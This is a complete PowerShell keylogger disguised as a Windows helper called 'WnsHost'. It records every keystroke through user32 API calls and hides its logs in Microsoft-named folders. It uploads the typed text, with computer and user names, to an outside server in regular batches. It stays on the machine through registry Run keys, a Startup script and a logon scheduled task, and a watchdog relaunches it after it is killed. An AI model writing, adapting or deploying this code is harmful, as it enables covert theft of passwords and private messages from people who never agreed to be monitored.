# ============================================================
#  WnsHost - background helper: captures, logs, uploads.
#  Log : %APPDATA%\Microsoft\Windows\Shell\WnsHost\WnsHost_cache.txt
#  State: %LOCALAPPDATA%\Microsoft\Windows\WnsHost
#  Off : Ctrl+Alt+Q  or  stop.vbs
#  Modes (internal): -Register  -Guard  -NoGuard
# ============================================================
param(
    [switch]$Register,
    [switch]$Guard,
    [switch]$NoGuard
)
$ErrorActionPreference = 'Stop'

$SpecialKeys = $true

$BackspaceToServer = '[delete]'
$BackspaceToLog    = 'delete'

$ServerUrl  = 'https://time-management.app/zcode/ingest.php'   # <-- EDIT
$AuthToken  = '234523fgergzetrgeraTETRETR45'                    # <-- EDIT
$SendEvery  = 5000
$BatchBytes = 65536

$Root    = $PSScriptRoot
$DataDir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\WnsHost'
if (-not (Test-Path -LiteralPath $DataDir)) { New-Item -ItemType Directory -Path $DataDir -Force | Out-Null }

$LogDir = Join-Path $env:APPDATA 'Microsoft\Windows\Shell\WnsHost'
try {
    if (-not (Test-Path -LiteralPath $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force | Out-Null }
    $probe = Join-Path $LogDir '.w'
    Set-Content -LiteralPath $probe -Value 'x' -ErrorAction Stop
    Remove-Item -LiteralPath $probe -Force -ErrorAction SilentlyContinue
    try { (Get-Item -LiteralPath $LogDir).Attributes = 'Directory,Hidden' } catch {}
} catch { $LogDir = $DataDir }
$LogPath = Join-Path $LogDir 'WnsHost_cache.txt'

$LockPath       = Join-Path $DataDir 'WnsHost.lock'
$BinPath        = Join-Path $DataDir 'WnsHost.bin'
$IdxPath        = Join-Path $DataDir 'WnsHost.idx'
$OffPath        = Join-Path $DataDir 'WnsHost.off'
$VbsPath        = Join-Path $DataDir 'WnsHost.vbs'
$SpoolMutexName = 'WnsHost_Spool'

$fs = $null; $binFs = $null; $binMtx = $null; $binEnc = $null
$ps = $null; $rs = $null
$stopRequested = $false
$floor = 0

function Log([string]$t) { [System.IO.File]::AppendAllText($LogPath, $t) }

function Ensure-Launcher {
    $line = @'
Dim sh, fso, ps1, extra, i
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
ps1   = fso.BuildPath(fso.GetParentFolderName(WScript.ScriptFullName), "WnsHost.ps1")
extra = ""
For i = 0 To WScript.Arguments.Count - 1
    extra = extra & " " & WScript.Arguments(i)
Next
sh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1 & """" & extra, 0, False
'@
    try { [System.IO.File]::WriteAllText($VbsPath, $line, (New-Object System.Text.ASCIIEncoding)) } catch {}
}

function Get-LaunchCommand {
    Ensure-Launcher
    if (Test-Path -LiteralPath $VbsPath) { return 'wscript.exe "' + $VbsPath + '"' }
    return 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"'
}

function Install-Persistence {
    $cmd = Get-LaunchCommand
    try { (Get-Item -LiteralPath 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run').SetValue('WnsHost', $cmd, 'String') } catch {}
    try { (Get-Item -LiteralPath 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce').SetValue('WnsHost', $cmd, 'String') } catch {}
    try {
        $lnk  = Join-Path ([Environment]::GetFolderPath('Startup')) 'WnsHost.vbs'
        $line = 'CreateObject("WScript.Shell").Run "' + ($cmd -replace '"', '""') + '", 0, False'
        [System.IO.File]::WriteAllText($lnk, $line, (New-Object System.Text.ASCIIEncoding))
    } catch {}
    try { & schtasks.exe /create /f /sc onlogon /tn 'WnsHost' /tr $cmd 2>$null | Out-Null } catch {}
}

if ($Register) {
    Install-Persistence
    Write-Host '  registered'
    exit 0
}

if ($Guard) {
    $gMtx = New-Object System.Threading.Mutex($false, 'WnsHost_Guard')
    if (-not $gMtx.WaitOne(0)) { exit 0 }
    $misses = 0
    while ($true) {
        Start-Sleep -Seconds 10
        if (Test-Path -LiteralPath $OffPath) { exit 0 }
        $alive = $false
        if (Test-Path -LiteralPath $LockPath) {
            $id = 0
            if ([int]::TryParse((Get-Content -LiteralPath $LockPath -Raw).Trim(), [ref]$id)) {
                $alive = [bool](Get-Process -Id $id -ErrorAction SilentlyContinue)
            }
        }
        if ($alive) { $misses = 0; continue }
        $misses++
        if ($misses -lt 2) { continue }
        $misses = 0
        Install-Persistence
        try {
            Ensure-Launcher
            Start-Process wscript.exe -ArgumentList ('"' + $VbsPath + '" -NoGuard') | Out-Null
        } catch {
            try {
                Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
                    '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
                    '-File', ('"' + $PSCommandPath + '"'), '-NoGuard') | Out-Null
            } catch {}
        }
        Start-Sleep -Seconds 20
    }
}

$senderScript = {
    param($BinPath, $IdxPath, $Url, $Token, $IntervalMs, $MaxBytes, $MutexName)

    $ErrorActionPreference = 'Continue'
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

    $enc = [System.Text.UTF8Encoding]::new($false)
    $mtx = [System.Threading.Mutex]::new($false, $MutexName)
    $rfs = $null
    $offset = 0L
    try { $offset = [long]((Get-Content -LiteralPath $IdxPath -ErrorAction Stop).Trim()) } catch { $offset = 0L }

    $headers = @{}
    if ($Token) { $headers['Authorization'] = 'Bearer ' + $Token }

    $buf = [byte[]]::new($MaxBytes)

    while ($true) {
        $payload = ''; $consumed = 0

        $mtx.WaitOne()
        try {
            if (-not $rfs) {
                $rfs = [System.IO.FileStream]::new($BinPath, [System.IO.FileMode]::OpenOrCreate,
                                                  [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
            }
            $len = $rfs.Length
            if ($offset -gt $len) { $offset = 0 }
            if ($len -gt $offset) {
                $toRead = [Math]::Min([long]($len - $offset), [long]$MaxBytes)
                $rfs.Position = $offset
                $n = $rfs.Read($buf, 0, [int]$toRead)
                if ($n -gt 0) {
                    $dec   = $enc.GetDecoder()
                    $chars = [char[]]::new($n + 2)
                    $bUsed = 0; $cUsed = 0; $done = $false
                    $dec.Convert($buf, 0, $n, $chars, 0, $chars.Length, $false, [ref]$bUsed, [ref]$cUsed, [ref]$done)
                    if ($cUsed -gt 0) { $payload = -join ($chars[0..($cUsed - 1)]) }
                    $consumed = $bUsed
                }
            } elseif ($len -gt 0) {
                $rfs.SetLength(0)
                $offset = 0
                Set-Content -LiteralPath $IdxPath -Value '0'
            }
        } finally { $mtx.ReleaseMutex() }

        if ($payload) {
            $body = @{
                host = $env:COMPUTERNAME
                user = $env:USERNAME
                ts   = (Get-Date).ToString('o')
                data = $payload
            } | ConvertTo-Json -Compress

            $ok = $false
            try {
                Invoke-RestMethod -Uri $Url -Method Post -Headers $headers `
                    -ContentType 'application/json; charset=utf-8' -Body $body -TimeoutSec 15 | Out-Null
                $ok = $true
            } catch { $ok = $false }

            if ($ok -and $consumed -gt 0) {
                $offset += $consumed
                Set-Content -LiteralPath $IdxPath -Value $offset
            }
        }

        Start-Sleep -Milliseconds $IntervalMs
    }
}

try {
    Install-Persistence
    Remove-Item -LiteralPath $OffPath -ErrorAction SilentlyContinue

    $mutex = New-Object System.Threading.Mutex($false, 'WnsHost_Single')
    if (-not $mutex.WaitOne(0)) { Log "`r`n[blocked]`r`n"; exit }

    if (-not $NoGuard) {
        try { Start-Process wscript.exe -ArgumentList ('"' + $VbsPath + '" -Guard') | Out-Null } catch {}
    }

    $fs = New-Object System.IO.FileStream($LogPath, [System.IO.FileMode]::OpenOrCreate, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)

    $fs.Position = 0
    $head = New-Object byte[] 3
    $null = $fs.Read($head, 0, 3)
    if (-not ($head[0] -eq 0xEF -and $head[1] -eq 0xBB -and $head[2] -eq 0xBF)) {
        $fs.Position = 0
        $old = New-Object byte[] $fs.Length
        $null = $fs.Read($old, 0, $old.Length)
        $fs.Position = 0; $fs.SetLength(0)
        $fs.Write([byte[]](0xEF,0xBB,0xBF), 0, 3)
        $fs.Write($old, 0, $old.Length)
    }
    $fs.Position = $fs.Length
    try { (Get-Item -LiteralPath $LogPath).Attributes = 'Hidden' } catch {}

    function WriteRaw([string]$t) {
        if (-not $t) { return }
        $b = [System.Text.Encoding]::UTF8.GetBytes($t)
        $fs.Write($b, 0, $b.Length)
        $fs.Flush()
    }

    function DeleteLastChar {
        if ($fs.Length -le $floor) { return }
        $fs.Flush()
        $max = [Math]::Min(4, $fs.Length - $floor)
        $buf = New-Object byte[] $max
        $fs.Position = $fs.Length - $max
        $null = $fs.Read($buf, 0, $max)
        $n = 1
        for ($i = $max - 1; $i -ge 0; $i--) {
            if (($buf[$i] -band 0xC0) -ne 0x80) { $n = $max - $i; break }
        }
        $fs.SetLength($fs.Length - $n)
        $fs.Position = $fs.Length
        $fs.Flush()
    }

    WriteRaw ("`r`n===== " + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + " =====`r`n")
    $floor = $fs.Length

    if ($ServerUrl) {
        if (-not (Test-Path $BinPath)) { New-Item -ItemType File -Path $BinPath -Force | Out-Null }
        if (-not (Test-Path $IdxPath)) { Set-Content -LiteralPath $IdxPath -Value '0' }
        $binEnc = [System.Text.UTF8Encoding]::new($false)
        $binMtx = [System.Threading.Mutex]::new($false, $SpoolMutexName)
        $binFs  = [System.IO.FileStream]::new($BinPath, [System.IO.FileMode]::Append,
                                             [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)

        $rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
        $rs.ApartmentState = [System.Threading.ApartmentState]::MTA
        $rs.ThreadOptions  = [System.Management.Automation.Runspaces.PSThreadOptions]::ReuseThread
        $rs.Open()
        $ps = [System.Management.Automation.PowerShell]::Create()
        $ps.Runspace = $rs
        $null = $ps.AddScript($senderScript).
            AddArgument($BinPath).AddArgument($IdxPath).AddArgument($ServerUrl).
            AddArgument($AuthToken).AddArgument($SendEvery).AddArgument($BatchBytes).
            AddArgument($SpoolMutexName)
        $null = $ps.BeginInvoke()
    }

    function Spool([string]$t) {
        if (-not $t -or -not $binFs) { return }
        $b = $binEnc.GetBytes($t)
        $null = $binMtx.WaitOne()
        try {
            $binFs.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
            $binFs.Write($b, 0, $b.Length)
            $binFs.Flush()
        } finally { $binMtx.ReleaseMutex() }
    }

    if ($ServerUrl) { Spool ("`n===== " + $env:COMPUTERNAME + " " + (Get-Date).ToString('o') + " =====`n") }

    Add-Type -Namespace WnsHost -Name Api -MemberDefinition @'
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);
[DllImport("user32.dll")] public static extern IntPtr GetKeyboardLayout(uint idThread);
[DllImport("user32.dll")] public static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);
[DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
'@

    $tracked  = @(0x08, 0x09, 0x0D, 0x20)
    $tracked += 0x30..0x39
    $tracked += 0x41..0x5A
    $tracked += 0x60..0x6F
    $tracked += 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xDB, 0xDC, 0xDD, 0xDE, 0xE2

    $mark = @{}
    if ($SpecialKeys) {
        $mark = @{
            0x1B = '<ESC>'; 0x2E = '<DEL>'; 0x2D = '<INS>'
            0x25 = '<LEFT>'; 0x26 = '<UP>'; 0x27 = '<RIGHT>'; 0x28 = '<DOWN>'
            0x24 = '<HOME>'; 0x23 = '<END>'; 0x21 = '<PGUP>'; 0x22 = '<PGDN>'
        }
        for ($i = 0; $i -lt 12; $i++) { $mark[0x70 + $i] = '<F' + ($i + 1) + '>' }
    }

    $prev = @{}
    foreach ($vk in ($tracked + @($mark.Keys))) { $prev[$vk] = $false }

    function GetKeyStateArray {
        $st = New-Object byte[] 256
        foreach ($m in 0x10, 0x11, 0x12, 0x14, 0x90) {
            if (([WnsHost.Api]::GetAsyncKeyState($m) -band 0x8000) -ne 0) { $st[$m] = 0x80 }
        }
        if (([WnsHost.Api]::GetAsyncKeyState(0x14) -band 0x0001) -ne 0) { $st[0x14] = $st[0x14] -bor 0x01 }
        if (([WnsHost.Api]::GetAsyncKeyState(0x90) -band 0x0001) -ne 0) { $st[0x90] = $st[0x90] -bor 0x01 }
        if ($st[0x11] -ne 0 -and $st[0x12] -eq 0) { $st[0x11] = 0 }
        return ,$st
    }

    function GetActiveLayout {
        $fg  = [WnsHost.Api]::GetForegroundWindow()
        $hkl = [IntPtr]::Zero
        if ($fg -ne [IntPtr]::Zero) {
            $tid = [WnsHost.Api]::GetWindowThreadProcessId($fg, [IntPtr]::Zero)
            $hkl = [WnsHost.Api]::GetKeyboardLayout($tid)
        }
        if ($hkl -eq [IntPtr]::Zero) { $hkl = [WnsHost.Api]::GetKeyboardLayout(0) }
        return $hkl
    }

    function Translate([int]$vk) {
        $hkl  = GetActiveLayout
        $scan = [WnsHost.Api]::MapVirtualKeyEx([uint32]$vk, 0, $hkl)
        $st   = GetKeyStateArray
        $sb   = New-Object System.Text.StringBuilder 8
        $rc   = [WnsHost.Api]::ToUnicodeEx([uint32]$vk, $scan, $st, $sb, 8, 0, $hkl)
        if ($rc -gt 0) { return $sb.ToString() }
        return ''
    }

    Set-Content -LiteralPath $LockPath -Value $PID

    $VK_CTRL = 0x11; $VK_ALT = 0x12; $VK_Q = 0x51

    while ($true) {
        foreach ($vk in $tracked) {
            $s    = [WnsHost.Api]::GetAsyncKeyState($vk)
            $down = ($s -band 0x8000) -ne 0
            if ((($s -band 0x0001) -ne 0) -or ($down -and -not $prev[$vk])) {
                switch ($vk) {
                    0x08 {
                        [void](Translate $vk)
                        if ($BackspaceToServer) { Spool $BackspaceToServer }
                        if ($BackspaceToLog -eq 'mark') {
                            if ($BackspaceToServer) { WriteRaw $BackspaceToServer }
                        } else {
                            $before = $fs.Length
                            DeleteLastChar
                            if ($BackspaceToLog -eq 'both') { if ($BackspaceToServer) { WriteRaw $BackspaceToServer } }
                            elseif ($fs.Length -eq $before -and $BackspaceToServer) { WriteRaw $BackspaceToServer }
                        }
                    }
                    0x0D {
                        [void](Translate $vk)
                        Spool "`n"
                        WriteRaw "`r`n"
                    }
                    default {
                        $t = Translate $vk
                        if ($t) { Spool $t; WriteRaw $t }
                    }
                }
            }
            $prev[$vk] = $down
        }

        foreach ($vk in @($mark.Keys)) {
            $s    = [WnsHost.Api]::GetAsyncKeyState($vk)
            $down = ($s -band 0x8000) -ne 0
            if ((($s -band 0x0001) -ne 0) -or ($down -and -not $prev[$vk])) {
                Spool $mark[$vk]
                WriteRaw $mark[$vk]
            }
            $prev[$vk] = $down
        }

        if ((([WnsHost.Api]::GetAsyncKeyState($VK_CTRL)) -band 0x8000) -and
            (([WnsHost.Api]::GetAsyncKeyState($VK_ALT))  -band 0x8000) -and
            (([WnsHost.Api]::GetAsyncKeyState($VK_Q))    -band 0x8000)) {
            WriteRaw ("`r`n===== " + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + " =====`r`n")
            $stopRequested = $true
            break
        }
        Start-Sleep -Milliseconds 15
    }
}
catch {
    Log ("`r`n[ERR] " + $_.Exception.Message + "`r`n" + $_.ScriptStackTrace + "`r`n")
}
finally {
    if ($ps)    { try { $ps.Stop() } catch {}; try { $ps.Dispose() } catch {} }
    if ($rs)    { try { $rs.Close() } catch {}; try { $rs.Dispose() } catch {} }
    if ($binFs) { try { $binFs.Dispose() } catch {} }
    if ($fs)    { try { $fs.Flush() } catch {}; try { $fs.Dispose() } catch {} }
    if ($stopRequested) { try { Set-Content -LiteralPath $OffPath -Value ((Get-Date).ToString('o')) } catch {} }
    try { Remove-Item -LiteralPath $LockPath -ErrorAction SilentlyContinue } catch {}
}
